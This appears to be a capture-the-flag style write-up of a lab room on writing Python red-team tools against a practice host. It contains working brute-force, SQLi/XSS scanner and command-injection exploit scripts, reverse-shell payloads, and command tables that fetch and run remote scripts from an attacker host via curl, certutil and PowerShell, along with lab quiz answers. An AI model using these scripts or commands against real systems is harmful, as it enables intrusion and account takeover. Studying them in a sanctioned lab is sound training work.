# Custom Tooling using Python

<img width="860" height="173" alt="image" src="https://github.com/user-attachments/assets/d4605618-a448-403f-ac40-e531d04daf7c" />

## Introduction

Creating your own custom tooling is critically important for web application red teaming, as you rarely find a tool or plugin that will do exactly what you need. This then calls for you to develop custom tooling!

Code is the most versatile option, as it allows you to create brand new software specifically for your needs. Being able to use code also allows you to take existing tools and exploits to customise them to your needs. 

While we will showcase using Python in this room, the principles can be applied to any coding language of your choice.

Add `MACHINE_IP` to your hosts `/etc/hosts` file with the command `echo "MACHINE_IP python.thm" | sudo tee -a /etc/hosts`

<img width="286" height="35" alt="image" src="https://github.com/user-attachments/assets/f3a707cf-6daf-4b8d-b1b1-cca71462512f" />

We will be using the web application running on this machine in the upcoming tasks.

## Using a Coding Language for Custom Tooling

### Why Create Your Own Tools?

When you go up against a web application during a red team, relying solely on existing tools may not always be sufficient. While there are many open-source and commercial options available, they may not fully align with the specific needs of your engagement.

Creating custom tooling allows you to:
- Tailor functionality to your specific needs
- Automate exploit and create automated workflows to perform repetitive tasks
- Bypass detection mechanisms
- Modify existing exploits and tools to suit your exact needs

Coding is the ultimate form of this. It allows you to either create something entirely from scratch or build a new tool from existing parts.

### To Script or Not to Script

When selecting a language for building your custom tools, one of the primary considerations is whether to use a scripting language or a compiled language. 

While it is good to be able to do both, it is worth considering which is best for your current situation given their advantages and trade-offs:

| Decision Factor     | Scripting Languages (Python, Ruby, JavaScript)                                                                 | Compiled Languages (Go, C++, .NET)                                                                 |
|---------------------|----------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------|
| Speed of Development | Fast development and testing as code is immediately interpreted and executed                                  | Slower development due to compilation requirements                                                 |
| Performance         | Generally slower as interpretation only happens at runtime                                                    | Faster execution as it can be compiled and optimised into machine code                             |
| Ease of Use         | Easier to create and modify on the fly                                                                         | More complex to modify and stricter syntax complexities                                            |
| Portability         | Cross-platform but depends on interpreter availability                                                        | Platform-specific builds, but compiled versions often run with native software                     |
| Detection and Evasion | Can be obfuscated but may trigger AV/EDR due to scripting signatures                                          | Harder to analyse, sometimes better at bypassing detection mechanisms                              |
| OS Interfacing      | Great for automation and tool scripting                                                                       | Provides lower-level access to system resources                                                    |

### Choosing the Right Language

Different coding languages have unique strengths and weaknesses when creating custom tooling and exploits. Let's take a look at a comparison:

| Language   | Type      | Key Features                                      | Advantages                                                            | Disadvantages                                                                 |
|------------|-----------|---------------------------------------------------|------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| Python     | Scripting | Extensive libraries and dynamic typing            | Easy to learn and allows for fast prototyping                          | Slower execution and often easily detected by AVs or EDRs                     |
| JavaScript | Scripting | Browser-based and easy-to-perform threading       | Useful for web-based exploits and widely supported in web applications | Not suitable for low-level system tasks and has a high detection rate         |
| Go (Golang)| Compiled  | Statically typed and provides efficient concurrency | Fast execution and easy cross-compilation                              | Creates larger binary sizes and has fewer security-specific libraries currently |
| .NET (C#)  | Compiled  | Windows-focused and integrates well with system APIs | Good for Windows exploitation and has easy obfuscation techniques      | Limited cross-platform compatibility and requires the .NET runtime            |
| C++        | Compiled  | High performance and allows direct memory manipulation | Very fast execution and grants low-level system access (stealthy tools) | Complex syntax and harder to debug                                            |

### Popular Python

Among these options, Python remains one of the most widely used languages for building custom security tools and exploits. Some of the main reasons for its popularity are:
- Python has an extensive library list for things like networking, web interaction, and automation.
- Python scripts can run on any operating system with the Python interpreter installed. Using libraries such as py2exe, you could even create a compiled binary of your Python code to execute on Windows systems that do not have the Python interpreter.
- Given Python's popularity, there is large community support for it, making it easy to modify it using existing tools.

Choosing the right coding language depends on the specific requirements of your custom tooling. While Python offers rapid development and strong community support, compiled languages like Go and .NET can provide better stealth and performance. 

### Answer the questions below

1. Does a scripting language perform better than a compiled language? (Yea/Nay)

Nay

2. Which compiled language is easy to cross-compile?

Go

3. Which scripting language is best suited for web-based exploits?

Javascript

## Developing a Brute-Forcing Tool

Let’s explore how we can develop a brute-forcing tool to bypass authentication.

Brute-force attacks involve trying multiple username-password combinations until the correct credentials are found. While these attacks are commonly mitigated by rate limiting and account lockout mechanisms, they still remain an easy-to-do job for hackers.

### Essential Commands

Before we start coding, let's go over some essential functions and techniques used in brute-forcing:
- **Requests library**: A Python library that facilitates sending HTTP requests and receiving responses from web apps. It has built-in functions to send custom headers like user-agent, HTTP method, and more. 
- **Handling responses**: Identifying successful logins based on HTTP status codes, redirects, or content patterns, which further helps to identify valid credentials.
- **String library**: Built-in functions from the String module make it easy to generate letter sequences, perform text formatting and manipulation, and more.

### Practical

In order to understand the essence of custom tooling using Python, consider a web application hosted at `http://python.thm/labs/lab1`. Visit the application, and you will see the following login panel. 

<img width="220" height="185" alt="image" src="https://github.com/user-attachments/assets/e64036ea-1dfa-461a-9556-3eda03a82dc2" />

As a pentester, your task is to bypass the authentication mechanism and get access to the main dashboard. Suppose you discover that the username is `admin` and the password is a 4-digit numeric value from the system logs or the frontend. 

One option is to manually try different combinations, but this is inefficient. A more viable approach is to use Python to automate the brute-force attack and try to attempt all possible 4-digit passwords.

Now, we will write a simple Python script to automate brute-force attacks. This script will attempt different password combinations against the server and, based on the response, determine whether a combination is valid. In the AttackBox, create a new script called `bruteforce.py` with the following code:

```
import requests

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```

### Key Areas in the Code 

- **Target URL**: The above code sends `POST` requests to `http://python.thm/labs/lab1/index.php`, simulating login attempts. The endpoint information is stored in the `url` variable.
- **Generating password list**: It creates a list of 4-digit numeric passwords (0000-9999) using Python’s `zfill()` function. If you need to iterate over characters, you can use `string.ascii_uppercase` for A-Z and `string.ascii_lowercase` for a-z. This is carried out through the code `password_list = [str(i).zfill(4) for i in range(10000)]`.
- **Brute-force function**: The brute_force function iterates through the password list, sending different username and password combinations to the server.
- **Response handling**: If the response does not contain the word "Invalid", the script assumes the login is successful and prints the valid credentials.

### Executing the Script

Navigate to the terminal and execute the following command python3 bruteforce.py. Upon execution, the script will try all possible 4-digit numeric passwords. Once it finds the correct password, it will display the valid credentials.

<img width="233" height="148" alt="image" src="https://github.com/user-attachments/assets/b19d4403-7d8a-4b7c-813a-707368ac410f" />

### Answer the questions below

1. What is one of the renowned Python libraries used to send HTTP requests, interact with web applications, and analyse responses?

Requests

2. What is the flag value after logging in as admin? You can customise the code to iterate between 1200 and 1250.

You can use the username as `admin` and password combination to get the flag.

<img width="665" height="231" alt="image" src="https://github.com/user-attachments/assets/12b90417-c4ae-445b-be9f-80d602ca6a04" />

3. Can you attempt to log in as Mark, whose password follows a specific pattern? His password consists of the first three characters as digits (000-999) followed by a single uppercase letter (A-Z). What is the flag value?

Changing username from `admin` to `Mark` and `password_list` in the python code

```
import requests
import string 

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

# Generating 3-digit numeric with uppercase letter (000-999)(A-Z)
password_list = [str(i).zfill(3) + letter for i in range(1000) for letter in string.ascii_uppercase]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text: 
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```

Run this code to get the right credentials and then use these credentials to get the flag.

<img width="214" height="104" alt="image" src="https://github.com/user-attachments/assets/1513d9f6-822c-4375-9552-dfb989538858" />

## Developing a Vulnerability Scanner

Now that we have explored how Python can automate brute-force attacks, let's move on to another important aspect of web security testing, which is vulnerability scanning. Web apps contain various flaws that can be exploited to gain unauthorised access, extract sensitive information, or even gain RCE. 

In this task, we will create a web scanner that will try one server-side vulnerability, SQLi and one client-side vulnerability, XSS.  

### Essential Commands
Before we start coding, let's cover some important Python libraries/commands that we will use:
- **Regular expressions (re)**: The `re` library in Python is used for pattern matching within responses. We can use regex to identify and match the content response against a set of error messages.
- **Threading**: Running scans sequentially is slow, so we use multi-threading to send multiple requests simultaneously, making our scanner faster and more efficient.

### Practical

Now, we will write code to prepare our vulnerability scanner, but first visit the page `http://python.thm/labs/lab2/greetings.php?id=2`, which would show a greeting message based on user ID as shown below: 

<img width="580" height="363" alt="image" src="https://github.com/user-attachments/assets/90daf046-d71e-4c0d-8468-0ba3a40ed42d" />

For SQLi, our logic is simple; we will try different payloads, such as `'`, `UNION SELECT 1,2,3 --`, `--`, etc., and then check the response for error messages like "SQL syntax error", "Unknown column", or "MySQL server error". If any of these errors appear, it indicates a potential SQL injection vulnerability.

Similarly, for XSS, we will inject payloads like `<script>alert("Hacked")</script>` and check if the same payload is reflected in the response without being sanitised. The application may be vulnerable to XSS attacks if it appears as is.

Now, we will write a simple Python script to scan the web application. In the AttackBox, create a new script `scanner.py` and copy the following code:

```
import requests
import re
import threading

url = "http://python.thm/labs/lab2/greetings.php?id="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()
```

### Key Areas in the Code 
- **Target URL**: The script sends `GET` requests to the web application, trying different inputs against the `id` parameter. The target URL is dynamically updated with different payloads using `params={"id": payload}` to check if the application processes input securely.
- **Defining payloads**: The script contains predefined payloads specifically designed to test for SQL injection and XSS vulnerabilities. SQL injection payloads attempt to manipulate database queries with inputs like `' OR '1'='1`, while XSS payloads insert JS such as `<script>alert('XSS')</script>` to check if it gets executed in the browser. 
- **Detecting vulnerabilities**: The scanner sends payloads to the application and examines the response for common database error messages. If the response contains phrases like "SQL syntax error", "Unknown column", or "MySQL server error", it indicates that the application is processing user input directly in SQL queries without proper validation. Similarly, the application is vulnerable to XSS if the payload is reflected in the page without escaping or encoding. 
- **Executing scans with multi-threading**: As a pentester, it is important to scan the website efficiently by speeding up the vulnerability scanning process. In this script, we are using multi-threading with `threading.Thread` to test multiple payload tests simultaneously. Instead of executing each payload one by one, threads allow numerous requests to be sent simultaneously, significantly reducing the scanning time.

### Executing the Script

Navigate to the terminal and execute the command `python3 scanner.py`. Upon execution, the script will try all the possible payloads and display whether it finds any SQL injection or XSS at the specified endpoint. 

<img width="369" height="35" alt="image" src="https://github.com/user-attachments/assets/6ef93824-0538-4b91-8e9d-5b901854704c" />

After executing the above code against the endpoint, we see that it finds two XSS vulnerabilities. Now, we can check if it is a false positive by manually using any of the above payloads and replacing it with the id parameter on our web app to execute the XSS attack. 

In this case, the vulnerable URL will be `http://python.thm/labs/lab2/greetings.php?id=%3Cscript%3Ealert(%27Hacked%27)%3C/script%3E`

A false positive is when a security scanner or tool reports a vulnerability — here, an XSS — but that report is incorrect

After executing the above payload, we will see a pop-up reflecting the injected payload, showing that the site is vulnerable to XSS. 

<img width="578" height="286" alt="image" src="https://github.com/user-attachments/assets/dd20ecd5-5ac4-4d80-9e31-765fe0db3543" />

To answer the following questions, consider the endpoint `http://python.thm/labs/lab2/departments.php?name=` that accepts the name as an input parameter and shows the relevant department, as shown below:

<img width="614" height="353" alt="image" src="https://github.com/user-attachments/assets/5d7c5e61-c0b1-4dbd-aafc-7d45b0abdf16" />

### Answer the questions below

1. How many vulnerabilities will be identified if we use the above `scanner.py` script with the updated URL `http://python.thm/labs/lab2/departments.php?name=`? (without changing the original code)

0

Update the `url` with `http://python.thm/labs/lab2/departments.php?name=` in `scanner.py` and execute the script

<img width="213" height="17" alt="image" src="https://github.com/user-attachments/assets/efa5587d-723a-4924-9154-1f2c59c59907" />

2. After tweaking the above script to use the appropriate `GET` parameter, how many payloads are found? (with changing the original code)

2

Updating the original code with the `name` parameter

```
#!/usr/bin/env python3
import requests
import threading

# Target (updated)
BASE = "http://python.thm/labs/lab2/departments.php"
PARAM = "name"
TIMEOUT = 8

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "sql syntax","sqlite3::query():", "mysql server", "syntax error", "unclosed quotation mark",
    "near 'select'","unknown column","warning: mysql_fetch","fatal error","sql error"
]

found = []   # store positive hits (thread-safe append via GIL is OK for simple use)

def scan_payload(vuln_type, payload):
    try:
        r = requests.get(BASE, params={PARAM: payload}, timeout=TIMEOUT)
        text = (r.text or "").lower()
    except Exception as e:
        print(f"[!] Request error for payload {payload!r}: {e}")
        return

    if vuln_type == "SQLi":
        if any(err in text for err in sqli_errors):
            print(f"[+] Potential SQLi detected with payload: {payload!r}")
            found.append((vuln_type, payload))
    elif vuln_type == "XSS":
        # simple reflected check: payload appears verbatim (not exhaustive)
        if payload.lower() in text:
            print(f"[+] Potential XSS detected with payload: {payload!r}")
            found.append((vuln_type, payload))

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        t.start()
        threads.append(t)

for t in threads:
    t.join()

# summary
print("\n=== SUMMARY ===")
total_tested = sum(len(v) for v in payloads.values())
print(f"Total payloads tested: {total_tested}")
print(f"Total positive findings: {len(found)}")
if found:
    for i, (vt, p) in enumerate(found, 1):
        print(f"{i}. {vt} — {p!r}")
```

<img width="337" height="91" alt="image" src="https://github.com/user-attachments/assets/75ca67d1-9e90-4523-a807-0c36389f470f" />

3. Which of the following is the valid type of vulnerability? Write the correct option only.

a) CSRF
b) SQL injection
c) Prototype Pollution
d) XSS

b

4. What is the name of the renowned library that is used to make concurrent requests to an endpoint?

Threading

## Creating a Basic Exploit

### Exploit Development Using Python

Python is one of the most widely used languages for exploit development due to its flexibility and powerful libraries. Python is often used to automate exploitation tasks such as:
- Identifying and exploiting injection vulnerabilities (e.g.,  SQLi, SSTI)
- Exploiting Remote Code Execution (RCE)
- Automating post-exploitation (e.g., reverse shells, privilege escalation)

Once an RCE vulnerability is identified, we can execute various commands for reconnaissance, privilege escalation, and lateral movement.

Here are common commands used on Linux and Windows targets:

**Linux RCE Commands**

| Command                                              | Description                                           |
|------------------------------------------------------|-------------------------------------------------------|
| `whoami`                                             | Displays the user executing the command               |
| `id`                                                 | Shows user and group IDs                              |
| `uname -a`                                           | Prints system details                                 |
| `cat /etc/passwd`                                    | Reads the system’s password file (if permissions allow) |
| `ls -la`                                             | Lists files with permissions and ownership            |
| `curl http://attacker.thm/shell.sh \| bash`          | Downloads and executes a shell script                 |
| `nc -e /bin/bash <attackbox_ip> <port>`              | Establishes a reverse shell                           |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'`    | Upgrades to an interactive shell                      |

**Windows RCE Commands**

| Command                                                                 | Description                                 |
|-------------------------------------------------------------------------|---------------------------------------------|
| `whoami`                                                                | Shows the current user                      |
| `hostname`                                                              | Displays system hostname                    |
| `ipconfig /all`                                                         | Prints network information                  |
| `net user`                                                              | Lists local users                           |
| `tasklist`                                                              | Shows running processes                     |
| `certutil -urlcache -f http://attacker.thm/shell.exe shell.exe`         | Downloads a file (often abused to fetch malware) |
| `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"` | Downloads and executes a remote PowerShell payload |

### Writing an Exploit Script
The target web application has a vulnerable endpoint that allows user-controlled command execution: `http://python.thm/labs/lab3/execute.php?cmd=<command>`

<img width="340" height="87" alt="image" src="https://github.com/user-attachments/assets/c3c04fa4-6ba5-47a3-8e0a-1094901be3d0" />

Our goal is to write a Python script to exploit this endpoint and automate command execution.

#### Basic Exploit Script

The following Python script sends a malicious payload to the vulnerable web application and retrieves the command output:

```
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Command to execute
command = "whoami"

# Construct the exploit request
response = requests.get(TARGET_URL + command)

# Print the response
if response.status_code == 200:
    print("[+] Command Output:")
    print(response.text)
else:
    print("[-] Exploit failed. HTTP Status:", response.status_code)
```

<img width="145" height="38" alt="image" src="https://github.com/user-attachments/assets/f5fbde77-3f99-441d-b9a4-7bc50f82afdc" />

You can also check the `whoami` command directly from the website.

<img width="347" height="95" alt="image" src="https://github.com/user-attachments/assets/bb33a6c4-1e90-4a05-96fa-b4cfc7bb3ed6" />

#### Enhancing the Exploit

Instead of executing a single command, we can create an interactive shell to run multiple commands dynamically.

```
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
```

<img width="320" height="184" alt="image" src="https://github.com/user-attachments/assets/3fafeb54-f771-424e-b4a4-eaa3baacade6" />

#### Launching a Reverse Shell

Instead of executing commands one by one, we can use the exploit to send a reverse shell payload, which will give us persistent access.

First, we have to start a reverse shell listener in our VM or AttackBox that will catch the connection using the command: `nc -lvnp 4444`

##### Reverse Shell Payload (Linux)

We will be using the following payload in the next exploit script: `ncat ATTACKBOX_IP 4444 -e /bin/bash`

#### Automating Reverse Shell Execution

We can modify our exploit script to send a reverse shell automatically:

```
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Reverse shell payload (Change ATTACKBOX_IP)
payload = "ncat ATTACKBOX_IP 4444 -e /bin/bash"

print("[+] Sending reverse shell payload...")

requests.get(TARGET_URL + payload)
```

### Answer the questions below

What is the flag value?

Start the netcat listener on your AttackBox with and update your reverse shell python code with your AttackBox IP address.

Execute the python script and with ls and cat flag.txt command you get the flag!

<img width="193" height="39" alt="image" src="https://github.com/user-attachments/assets/2009f3ee-ae4e-4cca-8075-d42f43d2eee0" />

<img width="183" height="85" alt="image" src="https://github.com/user-attachments/assets/54d46772-787d-4935-b68f-33f89b4942ec" />

You can also get the flag directly from the web by cmd=cat flag.txt without exploiting the web but after exploiting you get the full control of target machine.

<img width="355" height="92" alt="image" src="https://github.com/user-attachments/assets/67e61c24-15ca-4fb3-8e39-fdbe8945a783" />

## Task Automation

### Automating Session Management

When automating attacks against web applications, managing session persistence is crucial. Many web applications rely on session-based authentication, where a session cookie is assigned after login and must be sent with every request. Instead of manually handling session cookies, Python's requests.Session() class automates cookie management, allowing an exploit to:
- Avoid manual login steps when testing a target
- Maintain persistence even if the session expires
- Help developers reproduce the exploit by automating complex interactions

For this task we will be dealing with login page as `http://python.thm/labs/lab4/login.php`

#### Maintaining the Session

Instead of sending credentials with every request, we can log in once, store the session, and use it for future interactions.

```
import requests

# Create a session object
session = requests.Session()

# Log in and maintain the session automatically
login_url = "http://python.thm/labs/lab4/login.php"
credentials = {"username": "admin", "password": "password123"}

response = session.post(login_url, data=credentials)

if "Welcome" in response.text:
    print("[+] Login successful. Session cookies are stored automatically!")
else:
    print("[-] Login failed.")
```

<img width="301" height="26" alt="image" src="https://github.com/user-attachments/assets/bad0ef33-81a9-493d-998f-b11f9b928bc6" />

After logging in, the `session` object remembers authentication cookies, allowing us to send authenticated requests without manually handling cookies.

#### Automation From Login to Code Execution

A well-automated exploit should handle:
- Bypassing authentication via brute-forcing the login panel
- Maintaining access by automating session management
- Escalating privileges using RCE to gain a reverse shell

Since `login.php` does not have brute force protection, we can automate credential guessing.

```
def brute_force_login():
    """Brute forces the login panel."""
    session = requests.Session()

    wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]

    for password in wordlist:
        print(f"[*] Trying password: {password}")
        data = {"username": USERNAME, "password": password}
        response = session.post(LOGIN_URL, data=data)

        if "Welcome" in response.text:
            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
            return session

    print("[-] Brute force failed.")
    return None
```

From the username as `admin` and password as `password123`, after login we can see the dashboard that it has drop down menu that executes commands like `date`

<img width="679" height="252" alt="image" src="https://github.com/user-attachments/assets/a5e6772b-d726-48bd-bfb6-af0457a33fc4" />

We can use this idea to manipulate the vulnerable drop-down menu to inject arbitrary commands.

```
def command_injection(session, command):
    """Exploits command injection by sending a modified drop-down value."""
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if response.status_code == 200:
        print(f"[+] Command Output:\n{response.text}")
    else:
        print("[-] Exploit failed.")

if session:
    command_injection(session, "id")
    command_injection(session, "whoami")
```

Now that we can execute arbitrary commands, we use this to spawn a reverse shell.

```
def get_reverse_shell(session, attacker_ip="ATTACKER_IP", attacker_port=4444):
    """Sends a reverse shell payload."""
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"

    print("[+] Sending reverse shell payload...")
    session.post(EXECUTE_URL, data={"cmd": payload})

if session:
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```

The following script combines session automation, command injection, and privilege escalation.

```
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```

Now, having started a listener with `nc -lvnp 4444` and saved the script as `exploit.py`, and run it using python3 as shown below:

<img width="522" height="293" alt="image" src="https://github.com/user-attachments/assets/a6ded55f-3748-43c3-ae5d-dd5d0a901b3d" />

If successful, the shell should connect back to our listener.

<img width="191" height="91" alt="image" src="https://github.com/user-attachments/assets/f6eeca84-8739-4425-972e-54de613ec206" />

### Answer the questions below

What is the flag?

Use the `cat` command to get the flag!

<img width="206" height="101" alt="image" src="https://github.com/user-attachments/assets/7a46379f-af5c-4023-930c-a9c134824ca0" />
